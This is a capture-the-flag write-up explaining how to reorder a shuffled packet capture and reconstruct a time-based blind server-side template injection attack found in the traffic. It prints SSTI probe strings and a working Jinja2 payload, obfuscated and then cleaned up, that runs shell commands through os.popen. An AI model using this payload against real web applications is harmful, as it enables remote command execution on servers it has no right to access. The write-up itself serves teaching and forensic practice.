## Judul Soal
Messed-Up

## Deskripsi Soal
>If I was more careful enough to organize my stuffs.<br>Author: コト

## Hint Soal
- It's been a while, since I managed my task in a proper order


## Penjelasan Penyelesaian Soal

Given a `xz compressed` file, contained packet-capture file named `messed-up.pcap`.<br><br>
Based on `static analysis`, we found several improper `packet.frame` like negative `time difference` & weird `3-way of handshake` (ACK packet without preceeded SYN-ACK or SYN packet) 

```bash
$ tshark -r messed-up.pcap | head                                          

    1   0.000000 0.000000000   172.90.0.2 → 172.90.0.1   TCP 66 80 → 40920 [ACK] Seq=1 Ack=1 Win=499 Len=0 TSval=4208859833 TSecr=1930426915
    2 295.713297 295.713297000   172.90.0.2 → 172.90.0.1   HTTP 2671 HTTP/1.1 200 OK  (text/html)
    3 186.075311 -109.637986000   172.90.0.1 → 172.90.0.2   TCP 66 43954 → 80 [ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=1930612990 TSecr=4209045908
    4 256.836423 70.761112000   172.90.0.1 → 172.90.0.2   TCP 66 45172 → 80 [ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=1930683751 TSecr=4209116669
    5 507.653147 250.816724000   172.90.0.2 → 172.90.0.1   TCP 66 80 → 49416 [ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=4209367486 TSecr=1930934528
    6 -184.626597 -692.279744000   172.90.0.1 → 172.90.0.2   TCP 66 37686 → 80 [ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=1930242288 TSecr=4208675206
    7 172.427445 357.054042000   172.90.0.2 → 172.90.0.1   TCP 66 80 → 43750 [ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=4209032260 TSecr=1930599342
    8 -301.420134 -473.847579000   172.90.0.2 → 172.90.0.1   HTTP 2671 HTTP/1.1 200 OK  (text/html)
    9 455.818461 757.238595000   172.90.0.1 → 172.90.0.2   HTTP 496 GET /login HTTP/1.1 
   10 -450.676476 -906.494937000   172.90.0.1 → 172.90.0.2   TCP 66 33238 → 80 [ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=1929976238 TSecr=4208409156

```

According to the `hint`, we knew that each `frame.packet` were not in a proper order. Using `reordercap` we can restore the correct `packet capture`

```bash
$ reordercap messed-up.pcap ordered.pcap
$ tshark -r ordered.pcap | head  

    1   0.000000 0.000000000   172.90.0.1 → 172.90.0.2   TCP 74 32828 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=1929950335 TSecr=0 WS=128
    2   0.000055 0.000055000   172.90.0.2 → 172.90.0.1   TCP 74 80 → 32828 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM=1 TSval=4208383253 TSecr=1929950335 WS=128
    3   0.000080 0.000025000   172.90.0.1 → 172.90.0.2   TCP 66 32828 → 80 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1929950335 TSecr=4208383253
    4   0.000246 0.000166000   172.90.0.1 → 172.90.0.2   HTTP 351 POST /register HTTP/1.1  (application/x-www-form-urlencoded)
    5   0.000275 0.000029000   172.90.0.2 → 172.90.0.1   TCP 66 80 → 32828 [ACK] Seq=1 Ack=286 Win=64896 Len=0 TSval=4208383253 TSecr=1929950335
    6   0.091390 0.091115000   172.90.0.2 → 172.90.0.1   HTTP 502 HTTP/1.1 302 FOUND  (text/html)
    7   0.091408 0.000018000   172.90.0.1 → 172.90.0.2   TCP 66 32828 → 80 [ACK] Seq=286 Ack=437 Win=64128 Len=0 TSval=1929950426 TSecr=4208383344
    8   0.094483 0.003075000   172.90.0.1 → 172.90.0.2   HTTP 228 GET /login HTTP/1.1 
    9   0.094537 0.000054000   172.90.0.2 → 172.90.0.1   TCP 66 80 → 32828 [ACK] Seq=437 Ack=448 Win=64768 Len=0 TSval=4208383347 TSecr=1929950429
   10   0.098638 0.004101000   172.90.0.2 → 172.90.0.1   HTTP 2596 HTTP/1.1 200 OK  (text/html)
                                                                                                
```

Here we found several `HTTP` packet contained `Server Side Template Injection` (SSTI) as shown as:

```bash
$ tshark -r ordered.pcap -Y 'urlencoded-form' -Tfields -e urlencoded-form.value | head -12

guest,12345,test@123.com
12345,test@123.com
10+10
{{ 2*2 }}
{{ flag }}
{{ request }}
{{ config }}
{{ username }}
{{ ().__class__ }}
{% if username == username %} 1337 {% endif %}
{% set tes = username[0] %} {% if tes == username[0] %} 1337 {% endif %}
request[email[18]+email[-71]+email[25]+email[90]+email[3]+email[-27]+email[-78]+email[-8]+email[-93]+email[-95]+email[29]]

```

We also found a response `Non-number operation are not supported` that implies `webservice` only accept `numerical result`

Furthermore, we also found that `attacker` tried to conduct `Blind Injection` using `delay time` as the indicator. For example:

```
# Payload we found:

{% set p = request[email[54]+email[-61]+email[35]+email[-59]+email[-95]+email[-70]+email[-42]+email[-21]+email[-95]+email[-47]+email[79]][email[32]+email[-64]+email[71]+email[37]+email[49]+email[2]+email[-42]+email[37]+email[68]+email[-64]+email[32]][email[32]+email[-64]+email[-94]+email[45]+email[1]+email[37]+email[75]+email[1]+email[79]+email[68]+email[32]+email[32]][email[32]+email[-64]+email[1]+email[9]+email[35]+email[49]+email[36]+email[-21]+email[32]+email[-64]](email[-47]+email[68])[email[35]+email[49]+email[35]+email[80]+email[-17]] %}{% if p(email[35]+email[-11]+email[-53])[email[-60]+email[-16]+email[54]+email[-53]]()[5][email[32]+email[32]+email[-16]+email[48]+email[-64]+email[-64]](email[-42]) %} {{ p(email[-28]+email[37]+email[80]+email[-16]+email[35]+email[72]+email[-12]+email[11]+email[56]+email[57])[email[-60]+email[80]+email[-42]+email[43]]() }} {% endif %}


# After some clean-up:

{% set p = request[application][__globals__][__builtins__][__import__](os)[popen] %}{% if p(pwd)[read]()[5][__eq__](a) %} {{ p(sleep 0.75)[read]() }} {% endif %}

```

Thus, we need a way to exfiltrate each `packet.frame` that have > `0.75 s` time difference, in order to extract the correct `response text`.

Using the solver script, we obtained:

```bash
$ python2 sv.py       
$ pwd
/opt/app

$ ls flag*
flag.zip

$ cat flag.zip
sh: cat: not found

$ base64 flag.zip
UEsDBBQDAAAIAEeTRlFrhl3uRwAAAE4AAAAIAAAAZmxhZy50eHQFwUsKgDAMBcC9p2loV17mYTGW
UhIhiT/EuzvTWBaPPii/WzL4LhnGxZOCcBVH2EPaEAlSBoMClSPYANQjoHxmk64r5vubflBLAQI/
AxQDAAAIAEeTRlFrhl3uRwAAAE4AAAAIACQAAAAAAAAAIIDAgQAAAABmbGFnLnR4dAoAIAAAAAAA
AQAYAAAP43/Tm9YBAA/jf9Ob1gEAjd8pDpzWAVBLBQYAAAAAAQABAFoAAABtAAAAAAA=

$ hostname
904db8da79f8

$ whoami
root

```

After extracting `flag.zip`, we finally found expected `flag.txt`